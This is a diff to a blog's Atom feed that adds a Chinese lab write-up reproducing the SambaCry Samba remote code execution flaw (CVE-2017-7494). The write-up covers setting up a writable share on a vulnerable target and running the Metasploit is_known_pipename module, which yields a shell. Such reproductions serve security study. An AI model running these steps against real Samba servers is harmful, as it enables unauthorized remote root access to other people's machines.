@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hamal.cc/"/>
-  <updated>2018-04-24T15:28:49.042Z</updated>
+  <updated>2018-05-20T15:43:45.228Z</updated>
   <id>http://hamal.cc/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux版永恒之蓝</title>
+    <link href="http://hamal.cc/2018/05/Linux%E7%89%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
+    <id>http://hamal.cc/2018/05/Linux版永恒之蓝/</id>
+    <published>2018-05-20T14:35:05.000Z</published>
+    <updated>2018-05-20T15:43:45.228Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>2017年5月24号，Samba官方发布4.6.4版本，声明修复了一个严重漏洞（CVE-2017-7494），可以造成远程代码执行，运行Samba服务的Linux/Unix设备，可能会被直接getshell。 <a id="more"></a><br>Samba是在Linux或Unix系统上用来实现文件共享和打印服务的通信协议，也是很多家用的智能硬件设备例如NAS设备内置的协议，采用服务端口445。由于Samba内置函数is_known_pipename里面出现字符过滤问题，导致攻击者可以向共享目录传递恶意文件，导致被远程代码执行。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Samba 3.5.0 ~ 4.5.10中间的所有版本。</p><h3 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h3><p>Kali Linux 2018 –&gt; Kali Linux 2017<br>渗透机：Kali Linux 2018（ip：192.168.31.85）<br>靶机：Kali Linux 2017（ip：192.168.31.184）</p><h4 id="Kali-Linux-2017，查看Samba版本"><a href="#Kali-Linux-2017，查看Samba版本" class="headerlink" title="Kali Linux 2017，查看Samba版本"></a>Kali Linux 2017，查看Samba版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">samba --version Version 4.5.8-Debian</span><br></pre></td></tr></table></figure><p><img src="/images/10.1.png" alt=""></p><h4 id="Kali-Linux-2017里面创建Samba共享目录"><a href="#Kali-Linux-2017里面创建Samba共享目录" class="headerlink" title="Kali Linux 2017里面创建Samba共享目录"></a>Kali Linux 2017里面创建Samba共享目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/public   //创建共享目录</span><br><span class="line">chmod 777 /tmp/public    //修改读写执行权限</span><br></pre></td></tr></table></figure><p><img src="/images/10.2.png" alt=""><br>这是SambaCry漏洞利用的前提，必须有一个共享目录，这样攻击者就可以在这个共享目录传递攻击代码并执行，获取到Root权限并控制肉鸡。</p><h4 id="Kali-Linux-2017-修改Samba配置文件"><a href="#Kali-Linux-2017-修改Samba配置文件" class="headerlink" title="Kali Linux 2017 修改Samba配置文件"></a>Kali Linux 2017 修改Samba配置文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br><span class="line"></span><br><span class="line">[public]</span><br><span class="line">  comment = public</span><br><span class="line">  browseable = yes</span><br><span class="line">  writeable = yes</span><br><span class="line">  path = /tmp/public</span><br><span class="line">  public = yes</span><br><span class="line">  read only = no</span><br></pre></td></tr></table></figure><p><img src="/images/10.3.png" alt=""></p><h4 id="Kali-Linux-2017-重启-启动Samba服务"><a href="#Kali-Linux-2017-重启-启动Samba服务" class="headerlink" title="Kali Linux 2017 重启/启动Samba服务"></a>Kali Linux 2017 重启/启动Samba服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/samba restart    //重启samba服务</span><br><span class="line">netstat -tnlp samba      //查看samba端口状态</span><br></pre></td></tr></table></figure><p><img src="/images/10.4.png" alt=""></p><h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><h4 id="Kali-Linux-2018-进入msf框架，使用SambaCry渗透模块"><a href="#Kali-Linux-2018-进入msf框架，使用SambaCry渗透模块" class="headerlink" title="Kali Linux 2018 进入msf框架，使用SambaCry渗透模块"></a>Kali Linux 2018 进入msf框架，使用SambaCry渗透模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    //进入msf</span><br><span class="line">use exploit/linux/samba/is_known_pipename     //使用渗透模块is_known_pipename</span><br><span class="line">info    //查看模块信息</span><br></pre></td></tr></table></figure><p><img src="/images/10.5.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options     //查看模块选项</span><br></pre></td></tr></table></figure></p><p><img src="/images/10.6.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.31.184    //设置靶机地址</span><br><span class="line">exploit    //开始攻击</span><br></pre></td></tr></table></figure></p><p><img src="/images/10.7.png" alt=""><br>成功拿到shell。<br><img src="/images/10.8.png" alt=""><br><a href="https://zhuanlan.zhihu.com/p/35321152" target="_blank" rel="noopener">参考文章</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h3&gt;&lt;p&gt;2017年5月24号，Samba官方发布4.6.4版本，声明修复了一个严重漏洞（CVE-2017-7494），可以造成远程代码执行，运行Samba服务的Linux/Unix设备，可能会被直接getshell。
+    
+    </summary>
+    
+      <category term="漏洞复现" scheme="http://hamal.cc/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="漏洞复现" scheme="http://hamal.cc/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>前台拿Webshell</title>
